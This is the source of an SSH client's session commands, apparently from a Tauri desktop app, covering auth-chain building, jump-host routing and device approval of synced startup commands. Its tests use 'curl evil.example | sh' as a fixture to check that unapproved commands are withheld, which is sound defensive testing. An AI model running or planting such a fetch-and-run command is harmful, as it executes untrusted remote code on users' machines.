//! Session commands: open/retry/duplicate/close/write/resize.
//!
//! `session_open` returns immediately with a session id; the connection runs
//! in a background task and reports progress on the per-session
//! [`Channel`]. Secrets arrive here from the connection dialog, are used to
//! build `AuthChoice`, and are only retained in memory (inside the live
//! session's `ConnectParams`, zeroized on drop).

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Arc;

use serde::Deserialize;
use tauri::State;
use tauri::ipc::Channel;
use termru_core::host::{AuthKind, AuthMethod, Host};
use termru_core::ids::HostId;
use termru_core::validate::{JumpNode, resolve_jump_chain};
use termru_ssh::{
    AgentForward, AuthChoice, ConnectParams, ConnectTimeouts, ForwardSpec, JumpHop, KeyIdentity,
    SecretValue, SessionOptions, SessionSetup,
};

use crate::app_error::CommandError;
use crate::secrets::{SecretKind, SecretStore};
use crate::state::sessions::spawn_connection;
use crate::state::{AppState, ENGINE_PROMPT_TIMEOUT, SessionInfo, SessionUpdate};

const MAX_DIMENSION: u16 = 500;

#[derive(Clone, Default, Deserialize)]
pub struct SessionSecrets {
    #[serde(default)]
    pub password: Option<String>,
    #[serde(default)]
    pub passphrase: Option<String>,
}

impl std::fmt::Debug for SessionSecrets {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // Never print secret material, even in logs.
        f.debug_struct("SessionSecrets")
            .field("password", &self.password.as_ref().map(|_| "[redacted]"))
            .field(
                "passphrase",
                &self.passphrase.as_ref().map(|_| "[redacted]"),
            )
            .finish()
    }
}

#[derive(Clone, Deserialize)]
pub struct SessionGeometry {
    #[serde(default = "default_cols")]
    pub cols: u16,
    #[serde(default = "default_rows")]
    pub rows: u16,
}

impl std::fmt::Debug for SessionGeometry {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("SessionGeometry")
            .field("cols", &self.cols)
            .field("rows", &self.rows)
            .finish()
    }
}

fn default_cols() -> u16 {
    80
}

fn default_rows() -> u16 {
    24
}

#[derive(Clone, Deserialize)]
pub struct SessionOpenOptions {
    #[serde(default = "default_cols")]
    pub cols: u16,
    #[serde(default = "default_rows")]
    pub rows: u16,
    #[serde(default)]
    pub secrets: SessionSecrets,
    /// Secrets for the jump hosts of the route, by host id (what the user
    /// typed for them). A jump host without an entry uses what the
    /// credential store holds for it.
    #[serde(default)]
    pub hop_secrets: HashMap<String, SessionSecrets>,
}

impl std::fmt::Debug for SessionOpenOptions {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("SessionOpenOptions")
            .field("cols", &self.cols)
            .field("rows", &self.rows)
            .field("secrets", &self.secrets)
            .field("hop_secrets", &self.hop_secrets.len())
            .finish()
    }
}

fn validate_geometry(cols: u16, rows: u16) -> Result<(), CommandError> {
    if !(2..=MAX_DIMENSION).contains(&cols) || !(1..=MAX_DIMENSION).contains(&rows) {
        return Err(CommandError::new(format!(
            "invalid terminal size {cols}x{rows} (allowed: 2-500 columns, 1-500 rows)"
        )));
    }
    Ok(())
}

/// The agent socket this process was started with (`None` on Windows, where
/// the engine looks for the OpenSSH named pipe and Pageant itself).
fn agent_socket() -> Option<PathBuf> {
    std::env::var_os("SSH_AUTH_SOCK").map(PathBuf::from)
}

/// Resolves the host's auth method into the **ordered chain** of methods the
/// engine tries, using the per-connection secrets supplied by the UI (never
/// persisted).
///
/// The engine probes the server first and skips the methods it does not
/// allow, so every chain ends with keyboard-interactive: a server that wants
/// a one-time code, or that only offers PAM prompts, can still be reached.
///
/// * password: the password, then keyboard-interactive answered with the same
///   password when the server asks for nothing but a password (the common PAM
///   setup that disables `PasswordAuthentication`);
/// * key file: the key (its passphrase is asked for when it is needed and not
///   stored), then keyboard-interactive;
/// * agent: the agent's keys, then keyboard-interactive.
///
/// That is the chain derived from the host's single method. A host that
/// stores an explicit `auth_order` gets exactly the methods it lists, in that
/// order (see [`build_ordered_auth`]).
pub(crate) fn build_auth(
    host: &Host,
    store: &termru_store::Store,
    secrets: &SessionSecrets,
) -> Result<Vec<AuthChoice>, CommandError> {
    if let Some(order) = &host.auth_order {
        return build_ordered_auth(host, order, store, secrets);
    }
    match &host.auth {
        AuthMethod::Password => {
            let password = password_for(host, secrets).ok_or_else(|| {
                CommandError::new(format!("host \"{}\" requires a password", host.name))
            })?;
            Ok(vec![
                AuthChoice::Password {
                    password: SecretValue::new(password.clone()),
                },
                AuthChoice::KeyboardInteractive {
                    password: Some(SecretValue::new(password)),
                },
            ])
        }
        AuthMethod::PrivateKey { identity_id } => Ok(vec![
            key_choice(host, *identity_id, store, secrets)?,
            AuthChoice::KeyboardInteractive { password: None },
        ]),
        AuthMethod::Agent => Ok(vec![
            agent_choice(),
            AuthChoice::KeyboardInteractive { password: None },
        ]),
    }
}

/// What the user typed, else what the OS credential store holds for the host.
fn password_for(host: &Host, secrets: &SessionSecrets) -> Option<String> {
    match secrets.password.clone() {
        Some(password) => Some(password),
        None => SecretStore::get(&host.id.to_string(), SecretKind::Password),
    }
}

fn agent_choice() -> AuthChoice {
    AuthChoice::Agent {
        socket: agent_socket(),
        // No identity is tied to an agent host (yet): the agent's own order
        // decides.
        prefer_fingerprint: None,
    }
}

fn key_choice(
    host: &Host,
    identity_id: termru_core::ids::IdentityId,
    store: &termru_store::Store,
    secrets: &SessionSecrets,
) -> Result<AuthChoice, CommandError> {
    let repos = store.repos();
    let identity = repos
        .identities()
        .get(identity_id)?
        .ok_or_else(|| CommandError::new("identity no longer exists"))?;
    let key_path = repos.identities().binding(identity_id)?.ok_or_else(|| {
        CommandError::new(format!(
            "identity \"{}\" has no private key bound on this device",
            identity.name
        ))
    })?;
    // What the user typed, else what the credential store holds for the
    // identity (or, from an older version, for this host). A key that needs a
    // passphrase and has none is asked about by the engine.
    let passphrase = match secrets.passphrase.clone() {
        Some(passphrase) => Some(passphrase),
        None => SecretStore::get_passphrase(&identity_id.to_string(), &host.id.to_string()),
    };
    Ok(AuthChoice::PrivateKey {
        key_path: PathBuf::from(key_path),
        passphrase: passphrase.map(SecretValue::new),
        identity: Some(KeyIdentity {
            id: identity_id.to_string(),
            name: identity.name,
        }),
    })
}

/// The chain of a host with an explicit `auth_order`: each listed method that
/// the host has the means for, in the listed order — and nothing else (no
/// keyboard-interactive unless it is listed).
///
/// * `Password`: the typed or stored password. For a host whose own method is
///   a password it is **required** (the connection dialog asks for it);
///   for any other host it is used when there is one and skipped otherwise;
/// * `PrivateKey`: the key of the host's identity; a host that does not use
///   one has none to offer, so the entry is skipped;
/// * `Agent`: the agent's keys;
/// * `KeyboardInteractive`: answered with the password when there is one and
///   the server asks for nothing else.
///
/// When nothing is left, the error says so instead of connecting to try
/// nothing.
fn build_ordered_auth(
    host: &Host,
    order: &[AuthKind],
    store: &termru_store::Store,
    secrets: &SessionSecrets,
) -> Result<Vec<AuthChoice>, CommandError> {
    let password_wanted = order
        .iter()
        .any(|kind| matches!(kind, AuthKind::Password | AuthKind::KeyboardInteractive));
    let password = if password_wanted {
        password_for(host, secrets)
    } else {
        None
    };
    let mut chain = Vec::with_capacity(order.len());
    for kind in order {
        match kind {
            AuthKind::Password => match &password {
                Some(password) => chain.push(AuthChoice::Password {
                    password: SecretValue::new(password.clone()),
                }),
                None if host.auth == AuthMethod::Password => {
                    return Err(CommandError::new(format!(
                        "host \"{}\" requires a password",
                        host.name
                    )));
                }
                None => {}
            },
            AuthKind::PrivateKey => {
                if let AuthMethod::PrivateKey { identity_id } = &host.auth {
                    chain.push(key_choice(host, *identity_id, store, secrets)?);
                }
            }
            AuthKind::Agent => chain.push(agent_choice()),
            AuthKind::KeyboardInteractive => chain.push(AuthChoice::KeyboardInteractive {
                password: password.clone().map(SecretValue::new),
            }),
        }
    }
    if chain.is_empty() {
        return Err(CommandError::new(format!(
            "host \"{}\": none of the methods in its authentication order can be used here \
             (no password, key or agent to offer)",
            host.name
        )));
    }
    Ok(chain)
}

/// Everything about a connection that needs the store and the credential
/// vault: the host, its authentication, and the route to it.
pub(crate) struct Prepared {
    pub host: Host,
    /// Whether this device approved the host's exec-like fields (startup
    /// command, agent forwarding, environment, forwards that are not loopback
    /// only). Without it the session runs without them.
    pub exec_approved: bool,
    pub auth: Vec<AuthChoice>,
    /// The jump hosts, first hop first, each with its authentication.
    pub hops: Vec<(Host, Vec<AuthChoice>)>,
}

/// Loads the host, resolves its route through the jump hosts (every hop must
/// exist, no cycle, at most [`termru_core::validate::MAX_JUMP_HOPS`] hops) and
/// builds the authentication of the host and of every hop.
///
/// Blocking (SQLite, the credential store): never call it on an async worker.
pub(crate) fn prepare(
    store: &termru_store::Store,
    host_id: HostId,
    secrets: &SessionSecrets,
    hop_secrets: &HashMap<String, SessionSecrets>,
) -> Result<Prepared, CommandError> {
    let host = store
        .repos()
        .hosts()
        .get(host_id)?
        .ok_or_else(|| CommandError::not_found("host", &host_id.to_string()))?;
    if host.deleted {
        return Err(CommandError::new("host has been deleted"));
    }
    let route = resolve_jump_chain(host.id, &host.name, &host.jump_chain, &|id| {
        store
            .repos()
            .hosts()
            .get(id)
            .ok()
            .flatten()
            .map(|hop| JumpNode {
                name: hop.name,
                jump_chain: hop.jump_chain,
            })
    })?;
    let mut hops = Vec::with_capacity(route.len());
    for id in route {
        let hop = store
            .repos()
            .hosts()
            .get(id)?
            .ok_or_else(|| CommandError::not_found("jump host", &id.to_string()))?;
        let typed = hop_secrets
            .get(&id.to_string())
            .cloned()
            .unwrap_or_default();
        let auth = build_auth(&hop, store, &typed)
            .map_err(|error| CommandError::new(format!("jump host: {}", error.message)))?;
        hops.push((hop, auth));
    }
    let auth = build_auth(&host, store, secrets)?;
    let exec_approved = store.repos().hosts().exec_status(&host)?.approved;
    Ok(Prepared {
        host,
        exec_approved,
        auth,
        hops,
    })
}

/// The engine's parameters for one host (a jump host or the target). The
/// questions it may ask are bound to the session by [`AppState::scope_prompts`]
/// when the session is started; until then they refuse everything.
fn endpoint_params(state: &AppState, host: &Host, auth: Vec<AuthChoice>) -> ConnectParams {
    ConnectParams {
        host: host.address.clone(),
        port: host.port,
        username: host.username.clone(),
        auth,
        term: host.term.clone(),
        keepalive_seconds: host.keepalive_seconds,
        timeouts: ConnectTimeouts {
            // The registry of questions ends them first (and tells the
            // dialog); the engine's bound is the backstop.
            auth_prompt: ENGINE_PROMPT_TIMEOUT,
            ..ConnectTimeouts::default()
        },
        known_hosts_path: state.known_hosts_path.clone(),
        // The user's own known_hosts is trusted too, read only.
        extra_known_hosts: state.system_known_hosts.iter().cloned().collect(),
        host_key_prompt: Arc::new(termru_ssh::config::RejectUnknownHostKeys),
        auth_prompt: Arc::new(termru_ssh::NoAuthPrompts),
        setup: SessionSetup::default(),
    }
}

/// The parameters of a whole session: the host, the route to it and what the
/// session does besides connecting (forwards, environment, startup input,
/// agent forwarding).
pub(crate) fn build_params(state: &AppState, prepared: Prepared) -> ConnectParams {
    let Prepared {
        host,
        exec_approved,
        auth,
        hops,
    } = prepared;
    let mut params = endpoint_params(state, &host, auth);
    params.setup = session_setup(
        &host,
        hops.into_iter()
            .map(|(hop, auth)| JumpHop {
                label: hop.name.clone(),
                params: endpoint_params(state, &hop, auth),
            })
            .collect(),
        exec_approved,
    );
    params
}

/// What the host asks of its session. Only the **enabled** forwards run; each
/// is named by its index in the host's list so a disabled one keeps its slot.
///
/// The exec-like fields (startup command, agent forwarding, environment,
/// forwards that are not loopback only) arrive through sync, so they are used
/// only when `exec_approved`: this device's user approved exactly these values
/// (see `termru_core::exec_approval`). Without it the session connects
/// without them; forwards on loopback still run, under their own indices.
fn session_setup(host: &Host, jump: Vec<JumpHop>, exec_approved: bool) -> SessionSetup {
    SessionSetup {
        jump,
        forwards: host
            .forwards
            .iter()
            .enumerate()
            .filter(|(_, forward)| forward.enabled)
            .filter(|(_, forward)| exec_approved || forward.binds_loopback())
            .filter_map(|(index, forward)| {
                u32::try_from(index)
                    .ok()
                    .map(|id| ForwardSpec::from_forward(id, forward))
            })
            .collect(),
        env: if exec_approved {
            host.env
                .iter()
                .map(|var| (var.name.clone(), var.value.clone()))
                .collect()
        } else {
            Vec::new()
        },
        startup_command: host.startup_command.clone().filter(|_| exec_approved),
        agent_forward: (exec_approved && host.agent_forward).then(|| AgentForward {
            socket: agent_socket(),
        }),
    }
}

/// What a new session starts with.
struct Launch {
    host_id: HostId,
    params: ConnectParams,
    cols: u16,
    rows: u16,
    /// The session runs without the host's exec-like fields, which this device
    /// has not approved (the views are told).
    exec_pending: bool,
}

/// Registers the session and spawns its connection task.
fn start_session(
    state: &AppState,
    launch: Launch,
    window: &str,
    channel: Channel<SessionUpdate>,
) -> String {
    let Launch {
        host_id,
        params,
        cols,
        rows,
        exec_pending,
    } = launch;
    let options = SessionOptions {
        cols,
        rows,
        ..SessionOptions::default()
    };
    // The questions of the connection carry the session id: reserve it first.
    let id = state.sessions.reserve_id();
    let params = state.scope_prompts(params, &id);
    let cancel_rx = state
        .sessions
        .register_with_id(&id, host_id, params.clone(), window, channel);
    if exec_pending {
        // The first view is told (and so is every view that attaches later).
        state.sessions.set_exec_pending(&id);
    }
    spawn_connection(
        state.sessions.clone(),
        state.store.clone(),
        id.clone(),
        params,
        options,
        cancel_rx,
    );
    id
}

#[tauri::command]
pub async fn session_open(
    state: State<'_, AppState>,
    webview: tauri::Webview,
    host_id: HostId,
    options: SessionOpenOptions,
    channel: Channel<SessionUpdate>,
) -> Result<String, CommandError> {
    validate_geometry(options.cols, options.rows)?;
    // SQLite and the OS credential store (D-Bus / Keychain / Credential
    // Manager) can block for a long time; neither may run on an async worker.
    let store = state.store.clone();
    let secrets = options.secrets.clone();
    let hop_secrets = options.hop_secrets.clone();
    let prepared = tauri::async_runtime::spawn_blocking(move || {
        prepare(&store, host_id, &secrets, &hop_secrets)
    })
    .await
    .map_err(|error| CommandError::new(format!("the session could not be prepared: {error}")))??;
    let exec_pending = !prepared.exec_approved;
    let params = build_params(&state, prepared);
    Ok(start_session(
        &state,
        Launch {
            host_id,
            params,
            cols: options.cols,
            rows: options.rows,
            exec_pending,
        },
        webview.label(),
        channel,
    ))
}

#[tauri::command]
pub async fn session_retry(
    state: State<'_, AppState>,
    webview: tauri::Webview,
    id: String,
    geometry: SessionGeometry,
    channel: Channel<SessionUpdate>,
) -> Result<(), CommandError> {
    validate_geometry(geometry.cols, geometry.rows)?;
    let (params, cancel_rx) = state.sessions.retry_handle(&id)?;
    state
        .sessions
        .set_status(&id, crate::state::SessionStatusDto::Connecting);
    let options = SessionOptions {
        cols: geometry.cols,
        rows: geometry.rows,
        ..SessionOptions::default()
    };
    // The retry re-uses the session's existing views; the channel argument
    // is the (re)attaching view.
    state.sessions.add_view(&id, webview.label(), channel);
    spawn_connection(
        state.sessions.clone(),
        state.store.clone(),
        id,
        params,
        options,
        cancel_rx,
    );
    Ok(())
}

#[tauri::command]
pub async fn session_duplicate(
    state: State<'_, AppState>,
    webview: tauri::Webview,
    id: String,
    geometry: SessionGeometry,
    channel: Channel<SessionUpdate>,
) -> Result<String, CommandError> {
    validate_geometry(geometry.cols, geometry.rows)?;
    let info = state
        .sessions
        .info(&id)
        .ok_or_else(|| CommandError::not_found("session", &id))?;
    let params = state
        .sessions
        .params(&id)
        .ok_or_else(|| CommandError::not_found("session", &id))?;
    Ok(start_session(
        &state,
        Launch {
            host_id: info.host_id,
            params,
            cols: geometry.cols,
            rows: geometry.rows,
            // The copy runs with the same parameters, so it lacks the same fields.
            exec_pending: info.exec_pending,
        },
        webview.label(),
        channel,
    ))
}

#[tauri::command]
pub async fn session_close(state: State<'_, AppState>, id: String) -> Result<(), CommandError> {
    state.sessions.close(&id).await
}

/// Sends input to the session's shell.
///
/// Deliberately a **synchronous** command: synchronous commands run in the
/// order their IPC messages arrive, and the data is enqueued into the
/// session's ordered input queue before the command returns, so arrival order
/// is write order. (An async command would be spawned per call, and parallel
/// calls could enqueue in any order — keystrokes would arrive shuffled.)
/// Nothing here blocks: a full queue is reported as an error.
///
/// The webview may still deliver *concurrent* `invoke` calls out of order, so
/// the frontend has to serialize its writes (await the previous call, or
/// batch keystrokes into one chunk).
#[tauri::command]
pub fn session_write(
    state: State<'_, AppState>,
    id: String,
    data: Vec<u8>,
) -> Result<(), CommandError> {
    state.sessions.try_write(&id, data)
}

/// Records and applies the terminal size. Synchronous for the same ordering
/// reason as [`session_write`]: the newest size must win. While the session
/// is still connecting the size is stored and applied when it becomes ready.
#[tauri::command]
pub fn session_resize(
    state: State<'_, AppState>,
    id: String,
    cols: u16,
    rows: u16,
) -> Result<(), CommandError> {
    validate_geometry(cols, rows)?;
    state.sessions.resize(&id, cols, rows)
}

/// Releases the views the calling window holds on a session **without**
/// closing it (the tab moved to another window). The new window attaches only
/// after its webview has loaded, which is later than this call, so a session
/// that is left without a view is not closed here: it stays for the orphan
/// grace period and is closed by its connection task when nothing attached.
#[tauri::command]
pub fn session_detach(
    state: State<'_, AppState>,
    webview: tauri::Webview,
    id: String,
) -> Result<(), CommandError> {
    state.sessions.detach_window_views(&id, webview.label())
}

/// Attaches another view to a live session (a tab moved to a new window).
/// The SSH session is **not** restarted: the new view first receives the
/// replay buffer, then the live stream.
#[tauri::command]
pub async fn session_attach(
    state: State<'_, AppState>,
    webview: tauri::Webview,
    id: String,
    channel: Channel<SessionUpdate>,
) -> Result<(), CommandError> {
    state
        .sessions
        .attach_view(&id, webview.label(), channel)
        .await
}

#[tauri::command]
pub fn session_list(state: State<'_, AppState>) -> Result<Vec<SessionInfo>, CommandError> {
    Ok(state.sessions.list())
}

/// Answers a pending host-key trust prompt (rejects unknown ids).
#[tauri::command]
pub fn host_key_prompt_resolve(
    state: State<'_, AppState>,
    id: String,
    trust: bool,
) -> Result<bool, CommandError> {
    Ok(state.host_keys.resolve(&id, trust))
}

/// Answers a pending authentication question: `answers` (one per prompt, in
/// order) or `None` to cancel. `false` when nobody is waiting any more (the
/// question timed out, or its session ended).
///
/// The answers may be secrets: they become `SecretValue`s right here and are
/// never logged.
#[tauri::command]
pub fn auth_prompt_resolve(
    state: State<'_, AppState>,
    id: String,
    answers: Option<Vec<String>>,
) -> Result<bool, CommandError> {
    state
        .auth_prompts
        .resolve(&id, answers)
        .map_err(CommandError::new)
}

#[cfg(test)]
mod tests {
    use super::*;
    use termru_core::identity::Identity;
    use termru_core::ids::IdentityId;

    fn temp_store() -> (tempfile::TempDir, termru_store::Store) {
        let dir = tempfile::tempdir().expect("temp dir");
        let store = termru_store::Store::open(&dir.path().join("test.sqlite")).expect("store");
        (dir, store)
    }

    fn host_with(auth: AuthMethod) -> Host {
        let mut host = Host::new("web-1".into(), "web-1.test".into(), "deploy".into());
        host.auth = auth;
        host
    }

    #[test]
    fn geometry_bounds_are_enforced() {
        assert!(validate_geometry(80, 24).is_ok());
        assert!(validate_geometry(1, 24).is_err());
        assert!(validate_geometry(80, 0).is_err());
        assert!(validate_geometry(501, 24).is_err());
        assert!(validate_geometry(80, 501).is_err());
        let message = validate_geometry(0, 0).unwrap_err().message;
        assert!(message.contains("invalid terminal size"), "{message}");
    }

    fn names(chain: &[AuthChoice]) -> Vec<&'static str> {
        chain.iter().map(AuthChoice::method_name).collect()
    }

    #[test]
    fn password_auth_requires_a_supplied_password() {
        let (_dir, store) = temp_store();
        let host = host_with(AuthMethod::Password);
        let missing = build_auth(&host, &store, &SessionSecrets::default());
        let error = missing.expect_err("password must be required");
        assert!(error.message.contains("requires a password"));
        assert!(!error.message.contains("secret"));

        let supplied = build_auth(
            &host,
            &store,
            &SessionSecrets {
                password: Some("hunter2".into()),
                passphrase: None,
            },
        )
        .expect("auth builds");
        assert_eq!(names(&supplied), ["password", "keyboard-interactive"]);
        match &supplied[..] {
            [
                AuthChoice::Password { password },
                AuthChoice::KeyboardInteractive {
                    password: Some(answer),
                },
            ] => {
                assert_eq!(password.expose(), "hunter2");
                assert_eq!(answer.expose(), "hunter2");
            }
            other => panic!("wrong chain: {other:?}"),
        }
    }

    #[test]
    fn agent_auth_never_panics_without_ssh_auth_sock() {
        let (_dir, store) = temp_store();
        let host = host_with(AuthMethod::Agent);
        let chain = build_auth(&host, &store, &SessionSecrets::default()).expect("agent builds");
        assert_eq!(names(&chain), ["publickey (agent)", "keyboard-interactive"]);
        assert!(matches!(
            chain[1],
            AuthChoice::KeyboardInteractive { password: None }
        ));
    }

    #[test]
    fn private_key_auth_requires_a_bound_key_and_identity() {
        let (_dir, store) = temp_store();
        let missing_identity = host_with(AuthMethod::PrivateKey {
            identity_id: IdentityId::new(),
        });
        let error = build_auth(&missing_identity, &store, &SessionSecrets::default())
            .expect_err("identity must exist");
        assert!(
            error.message.contains("no longer exists"),
            "{}",
            error.message
        );

        let mut identity = Identity::new("default key".into());
        store
            .repos()
            .identities()
            .save(&mut identity)
            .expect("save identity");
        let unbound = host_with(AuthMethod::PrivateKey {
            identity_id: identity.id,
        });
        let error =
            build_auth(&unbound, &store, &SessionSecrets::default()).expect_err("must be bound");
        assert!(
            error.message.contains("no private key bound"),
            "{}",
            error.message
        );

        store
            .repos()
            .identities()
            .bind(identity.id, "/home/user/.ssh/id_ed25519")
            .expect("bind");
        let chain = build_auth(
            &unbound,
            &store,
            &SessionSecrets {
                password: None,
                passphrase: Some("open-sesame".into()),
            },
        )
        .expect("auth builds");
        assert_eq!(names(&chain), ["publickey", "keyboard-interactive"]);
        match &chain[0] {
            AuthChoice::PrivateKey {
                key_path,
                passphrase,
                identity: key_identity,
            } => {
                assert_eq!(key_path, &PathBuf::from("/home/user/.ssh/id_ed25519"));
                assert_eq!(
                    passphrase.as_ref().expect("passphrase").expose(),
                    "open-sesame"
                );
                // The prompt names the key by its identity, and a remembered
                // passphrase is stored for exactly this identity.
                let key_identity = key_identity.as_ref().expect("identity");
                assert_eq!(key_identity.name, "default key");
                assert_eq!(key_identity.id, identity.id.to_string());
            }
            other => panic!("wrong variant: {}", other.method_name()),
        }
    }

    #[test]
    fn secrets_never_serialize_into_debug_output() {
        let secrets = SessionSecrets {
            password: Some("top-secret".into()),
            passphrase: Some("also-secret".into()),
        };
        let debug = format!("{secrets:?}");
        assert!(!debug.contains("top-secret"), "{debug}");
        assert!(!debug.contains("also-secret"), "{debug}");
    }

    // ---- data model v2: auth order, route, setup ----

    fn secrets(password: Option<&str>) -> SessionSecrets {
        SessionSecrets {
            password: password.map(str::to_string),
            passphrase: None,
        }
    }

    #[test]
    fn an_explicit_auth_order_is_followed_exactly() {
        let (_dir, store) = temp_store();
        let mut host = host_with(AuthMethod::Password);
        host.auth_order = Some(vec![AuthKind::Agent, AuthKind::Password]);
        let chain = build_auth(&host, &store, &secrets(Some("pw"))).expect("builds");
        assert_eq!(names(&chain), ["publickey (agent)", "password"]);

        // No keyboard-interactive unless it is listed.
        host.auth_order = Some(vec![AuthKind::KeyboardInteractive, AuthKind::Password]);
        let chain = build_auth(&host, &store, &secrets(Some("pw"))).expect("builds");
        assert_eq!(names(&chain), ["keyboard-interactive", "password"]);
        match &chain[0] {
            AuthChoice::KeyboardInteractive { password } => {
                assert_eq!(password.as_ref().expect("answers").expose(), "pw");
            }
            other => panic!("wrong variant: {}", other.method_name()),
        }
    }

    #[test]
    fn a_listed_password_is_required_only_for_a_password_host() {
        let (_dir, store) = temp_store();
        let mut host = host_with(AuthMethod::Password);
        host.auth_order = Some(vec![AuthKind::Password, AuthKind::Agent]);
        let error = build_auth(&host, &store, &SessionSecrets::default()).expect_err("required");
        assert!(
            error.message.contains("requires a password"),
            "{}",
            error.message
        );

        // An agent host that lists a password it does not have just skips it.
        let mut host = host_with(AuthMethod::Agent);
        host.id = HostId::new();
        host.auth_order = Some(vec![AuthKind::Password, AuthKind::Agent]);
        let chain = build_auth(&host, &store, &SessionSecrets::default()).expect("builds");
        assert_eq!(names(&chain), ["publickey (agent)"]);
    }

    #[test]
    fn an_order_with_nothing_usable_says_so() {
        let (_dir, store) = temp_store();
        // A key entry for a host that has no identity.
        let mut host = host_with(AuthMethod::Agent);
        host.auth_order = Some(vec![AuthKind::PrivateKey]);
        let error = build_auth(&host, &store, &SessionSecrets::default()).expect_err("empty");
        assert!(
            error.message.contains("none of the methods"),
            "{}",
            error.message
        );
    }

    #[test]
    fn a_listed_key_uses_the_hosts_identity() {
        let (_dir, store) = temp_store();
        let mut identity = Identity::new("key".into());
        store
            .repos()
            .identities()
            .save(&mut identity)
            .expect("save");
        store
            .repos()
            .identities()
            .bind(identity.id, "/home/u/.ssh/id")
            .expect("bind");
        let mut host = host_with(AuthMethod::PrivateKey {
            identity_id: identity.id,
        });
        host.auth_order = Some(vec![AuthKind::Agent, AuthKind::PrivateKey]);
        let chain = build_auth(&host, &store, &SessionSecrets::default()).expect("builds");
        assert_eq!(names(&chain), ["publickey (agent)", "publickey"]);
    }

    #[test]
    fn the_setup_carries_only_the_enabled_forwards_by_their_index() {
        use termru_core::{EnvVar, Forward, ForwardKind};
        let forward = |kind, enabled, port| Forward {
            kind,
            bind_address: None,
            bind_port: port,
            target_host: (kind != ForwardKind::Dynamic).then(|| "db".to_string()),
            target_port: (kind != ForwardKind::Dynamic).then_some(5432),
            enabled,
        };
        let mut host = host_with(AuthMethod::Agent);
        host.forwards = vec![
            forward(ForwardKind::Local, true, 8080),
            forward(ForwardKind::Dynamic, false, 1080),
            forward(ForwardKind::Remote, true, 9000),
        ];
        host.env = vec![EnvVar {
            name: "TERMRU_PROFILE".into(),
            value: "ops".into(),
        }];
        host.startup_command = Some("uptime".into());
        let setup = session_setup(&host, Vec::new(), true);
        let ids: Vec<(u32, ForwardKind)> = setup.forwards.iter().map(|f| (f.id, f.kind)).collect();
        assert_eq!(ids, vec![(0, ForwardKind::Local), (2, ForwardKind::Remote)]);
        assert_eq!(
            setup.env,
            vec![("TERMRU_PROFILE".to_string(), "ops".to_string())]
        );
        assert_eq!(setup.startup_command.as_deref(), Some("uptime"));
        assert!(setup.agent_forward.is_none(), "agent forwarding is opt-in");
        host.agent_forward = true;
        assert!(
            session_setup(&host, Vec::new(), true)
                .agent_forward
                .is_some()
        );
    }

    /// A host whose exec-like fields this device has not approved.
    fn host_with_exec_fields() -> Host {
        use termru_core::{EnvVar, Forward, ForwardKind};
        let forward = |kind, bind: Option<&str>, port| Forward {
            kind,
            bind_address: bind.map(str::to_string),
            bind_port: port,
            target_host: (kind != ForwardKind::Dynamic).then(|| "db".to_string()),
            target_port: (kind != ForwardKind::Dynamic).then_some(5432),
            enabled: true,
        };
        let mut host = host_with(AuthMethod::Agent);
        host.forwards = vec![
            forward(ForwardKind::Local, Some("0.0.0.0"), 9000),
            forward(ForwardKind::Local, None, 8080),
            forward(ForwardKind::Dynamic, Some("127.0.0.1"), 1080),
        ];
        host.env = vec![EnvVar {
            name: "TERMRU_PROFILE".into(),
            value: "ops".into(),
        }];
        host.startup_command = Some("curl evil.example | sh".into());
        host.agent_forward = true;
        host
    }

    #[test]
    fn unapproved_exec_fields_are_left_out_of_the_session() {
        let host = host_with_exec_fields();
        let setup = session_setup(&host, Vec::new(), false);
        assert!(setup.startup_command.is_none(), "no startup command");
        assert!(setup.agent_forward.is_none(), "no agent forwarding");
        assert!(setup.env.is_empty(), "no environment");
        // Loopback forwards still run, under the index they have in the host
        // (the first, exposed one is gone, so ids 1 and 2 remain).
        let ids: Vec<u32> = setup.forwards.iter().map(|f| f.id).collect();
        assert_eq!(ids, vec![1, 2]);
    }

    #[test]
    fn approved_exec_fields_are_all_used() {
        let host = host_with_exec_fields();
        let setup = session_setup(&host, Vec::new(), true);
        assert_eq!(
            setup.startup_command.as_deref(),
            Some("curl evil.example | sh")
        );
        assert!(setup.agent_forward.is_some());
        assert_eq!(setup.env.len(), 1);
        let ids: Vec<u32> = setup.forwards.iter().map(|f| f.id).collect();
        assert_eq!(ids, vec![0, 1, 2]);
    }

    /// Through the store, as a connection goes: a host that arrived through
    /// sync is not approved, approving the reviewed hash applies the fields,
    /// a later synced change withholds them again, and saving in the editor
    /// approves what it saved.
    #[test]
    fn the_connection_follows_the_approval_of_this_device() {
        let (_dir, store) = temp_store();
        let mut host = host_with_exec_fields();
        // Not a local edit: the record came from the sync account.
        store.repos().hosts().save(&mut host).expect("save");
        let prepare_host = |store: &termru_store::Store, id| {
            prepare(store, id, &SessionSecrets::default(), &HashMap::new()).expect("prepare")
        };

        let prepared = prepare_host(&store, host.id);
        assert!(!prepared.exec_approved, "a synced host is not approved");

        let hash = store
            .repos()
            .hosts()
            .exec_status(&prepared.host)
            .expect("status")
            .hash;
        crate::commands::hosts::approve_exec(&store, host.id, &hash).expect("approve");
        let prepared = prepare_host(&store, host.id);
        assert!(prepared.exec_approved, "approved after the review");
        assert!(
            session_setup(&prepared.host, Vec::new(), prepared.exec_approved)
                .startup_command
                .is_some()
        );

        // The sync account changes the command: withheld again.
        let mut changed = prepared.host.clone();
        changed.startup_command = Some("reboot".into());
        store.repos().hosts().save(&mut changed).expect("save");
        assert!(!prepare_host(&store, host.id).exec_approved);

        // The user edits the host on this device: the editor approves it.
        let mut edited = changed;
        edited.startup_command = Some("uptime".into());
        store
            .repos()
            .hosts()
            .save_approved(&mut edited)
            .expect("save");
        let prepared = prepare_host(&store, host.id);
        assert!(prepared.exec_approved);
        assert_eq!(
            session_setup(&prepared.host, Vec::new(), true)
                .startup_command
                .as_deref(),
            Some("uptime")
        );
    }

    #[test]
    fn a_plain_host_never_needs_approval() {
        let (_dir, store) = temp_store();
        let mut host = host_with(AuthMethod::Agent);
        store.repos().hosts().save(&mut host).expect("save");
        let prepared =
            prepare(&store, host.id, &SessionSecrets::default(), &HashMap::new()).expect("prepare");
        assert!(prepared.exec_approved);
    }

    #[test]
    fn the_route_is_resolved_through_the_store_with_each_hops_own_auth() {
        let (_dir, store) = temp_store();
